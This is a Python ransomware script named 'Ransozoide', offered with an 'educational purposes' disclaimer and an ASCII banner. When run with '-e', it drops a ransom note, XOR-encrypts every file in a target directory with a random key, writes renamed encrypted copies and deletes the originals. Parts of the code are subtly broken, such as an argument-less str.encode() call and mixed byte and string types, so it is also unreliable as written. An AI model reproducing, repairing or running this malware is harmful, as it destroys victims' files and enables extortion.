
import os
import string
import random
import sys

def str_xor (s1, s2):

	return "".join([chr(ord(c1) ^ ord(c2)) for (c1,c2) in zip(s1,s2)])

menu = r'''
--------------------------------------------------------------------------------------------------
Special Thanks to: ArielFreud 

[!] Legal Disclaimer: usage of Ransozoide without prior mutual consistency can be considered as an 
	illegal activity. it is the final user's responsibility to obey all applicable local, state and 
	federal laws. author assume no liability and are not responsible for any misuse or damage caused 
	by this program.

	That was developed for educational purposes!

--------------------------------------------------------------------------------------------------
$$$$$$$\   $$$$$$\  $$\   $$\  $$$$$$\   $$$$$$\  $$$$$$$$\  $$$$$$\  $$$$$$\ $$$$$$$\  $$$$$$$$\ 
$$  __$$\ $$  __$$\ $$$\  $$ |$$  __$$\ $$  __$$\ \____$$  |$$  __$$\ \_$$  _|$$  __$$\ $$  _____|
$$ |  $$ |$$ /  $$ |$$$$\ $$ |$$ /  \__|$$ /  $$ |    $$  / $$ /  $$ |  $$ |  $$ |  $$ |$$ |      
$$$$$$$  |$$$$$$$$ |$$ $$\$$ |\$$$$$$\  $$ |  $$ |   $$  /  $$ |  $$ |  $$ |  $$ |  $$ |$$$$$\    
$$  __$$< $$  __$$ |$$ \$$$$ | \____$$\ $$ |  $$ |  $$  /   $$ |  $$ |  $$ |  $$ |  $$ |$$  __|   
$$ |  $$ |$$ |  $$ |$$ |\$$$ |$$\   $$ |$$ |  $$ | $$  /    $$ |  $$ |  $$ |  $$ |  $$ |$$ |      
$$ |  $$ |$$ |  $$ |$$ | \$$ |\$$$$$$  | $$$$$$  |$$$$$$$$\  $$$$$$  |$$$$$$\ $$$$$$$  |$$$$$$$$\ 
\__|  \__|\__|  \__|\__|  \__| \______/  \______/ \________| \______/ \______|\_______/ \________|

CODED BY: Sargastico

MY GIT: https://github.com/Sargastico
--------------------------------------------------------------------------------------------------
'''
print(menu+ '\n')

diretorio = str.encode() # Insert the directory path here --> 'C:\\User\\test\\test_r'

key = (''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits + '^!\$%&/()=?{[]}+~#-_.:,;<>|\\') for _ in range(20000)))

with open('key.txt', 'w') as w:
	w.write(key)
	w.close()

if sys.argv[1] == '-e':

	arq = open('Leia-me.txt', 'w') 
	arq.write('OOOOPPSSSS! Files encrypted! =D \n')
	arq.close()

	for files in os.listdir(diretorio):
		os.chdir(diretorio)

		with open(files, 'rb') as r:
			data = r.read()
			r.close()
			enc = str_xor(data, key.strip('\n'))
			new_file = '(encrypted)'+os.path.basename(files)

		with open(new_file, 'wb') as n:
			n.write(enc)
			n.close()
			os.remove(files)
			print(os.path.basename(files)+" <<<<>>>> Encrypted! ")


